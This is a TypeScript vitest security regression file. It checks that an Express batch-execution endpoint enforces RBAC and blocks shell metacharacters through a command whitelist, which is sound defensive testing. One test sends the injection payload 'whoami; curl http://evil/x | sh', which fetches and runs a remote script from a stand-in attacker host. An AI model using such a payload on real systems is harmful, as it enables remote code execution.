import { describe, it, expect, beforeEach, vi, beforeAll, afterAll } from "vitest";
import express, { type Express, type RequestHandler } from "express";
import request from "supertest";
import { createHttpHarness, type HttpHarness } from "../helpers/httpHarness";
import { createExecutionsRouter } from "../../src/routes/executions";
import { errorHandler, requestIdMiddleware } from "../../src/middleware/errorHandler";
import { BoltCommandWhitelistService } from "../../src/validation/CommandWhitelistService";
import type { WhitelistConfig } from "../../src/config/schema";
import type { ExecutionRepository } from "../../src/database/ExecutionRepository";
import type { BatchExecutionService } from "../../src/services/BatchExecutionService";

/**
 * Security regression tests for finding H-1:
 * command-whitelist + RBAC bypass via /api/executions/batch.
 *
 * Verifies that the executions router:
 *  1. enforces the injected RBAC (bolt:execute) middleware on /batch, and
 *  2. validates command-type actions against the whitelist (blocking shell
 *     metacharacters) before delegating to BatchExecutionService.
 */
// One loopback-bound HTTP server for the whole file. See
// test/helpers/httpHarness.ts: supertest's default request(app) opens a
// fresh wildcard-bound socket per request, which on macOS can be shadowed
// by an unrelated process holding the same port on 127.0.0.1.
let harness: HttpHarness;

beforeAll(async () => {
  harness = await createHttpHarness();
});

afterAll(async () => {
  await harness.close();
});

describe("H-1: /api/executions/batch authorization + whitelist", () => {
  let executionRepository: ExecutionRepository;
  let batchExecutionService: BatchExecutionService;
  let whitelistService: BoltCommandWhitelistService;

  const allowAllConfig: WhitelistConfig = {
    allowAll: true,
    whitelist: [],
    matchMode: "exact",
  };

  const buildApp = (rbac: RequestHandler): Express => {
    const app = express();
    app.use(express.json());
    app.use(requestIdMiddleware);
    app.use(
      "/api/executions",
      createExecutionsRouter(
        executionRepository,
        undefined,
        batchExecutionService,
        undefined,
        rbac,
        whitelistService,
      ),
    );
    app.use(errorHandler);
    return app;
  };

  const allowRbac: RequestHandler = (_req, _res, next) => { next(); };
  const denyRbac: RequestHandler = (_req, res) => {
    res.status(403).json({ error: { code: "AUTHORIZATION_ERROR" } });
  };

  beforeEach(() => {
    executionRepository = {} as ExecutionRepository;
    batchExecutionService = {
      createBatch: vi.fn().mockResolvedValue({
        batchId: "batch-1",
        executionIds: ["e1"],
        targetCount: 1,
        expandedNodeIds: ["node1"],
      }),
      getBatchStatus: vi.fn(),
      cancelBatch: vi.fn(),
    } as unknown as BatchExecutionService;
    whitelistService = new BoltCommandWhitelistService(allowAllConfig);
    vi.clearAllMocks();
  });

  it("rejects the request with 403 when RBAC denies, without executing", async () => {
    const res = await request(harness.use(buildApp(denyRbac)))
      .post("/api/executions/batch")
      .send({ targetNodeIds: ["node1"], type: "command", action: "ls", tool: "bolt" });

    expect(res.status).toBe(403);
    expect(batchExecutionService.createBatch).not.toHaveBeenCalled();
  });

  it("blocks shell-metacharacter commands with 403 COMMAND_NOT_ALLOWED", async () => {
    const res = await request(harness.use(buildApp(allowRbac)))
      .post("/api/executions/batch")
      .send({
        targetNodeIds: ["node1"],
        type: "command",
        action: "whoami; curl http://evil/x | sh",
        tool: "bolt",
      });

    expect(res.status).toBe(403);
    expect(res.body.error.code).toBe("COMMAND_NOT_ALLOWED");
    expect(batchExecutionService.createBatch).not.toHaveBeenCalled();
  });

  it("allows a clean command through to the batch service", async () => {
    const res = await request(harness.use(buildApp(allowRbac)))
      .post("/api/executions/batch")
      .send({ targetNodeIds: ["node1"], type: "command", action: "ls -la", tool: "bolt" });

    expect(res.status).toBe(201);
    expect(batchExecutionService.createBatch).toHaveBeenCalledOnce();
  });
});
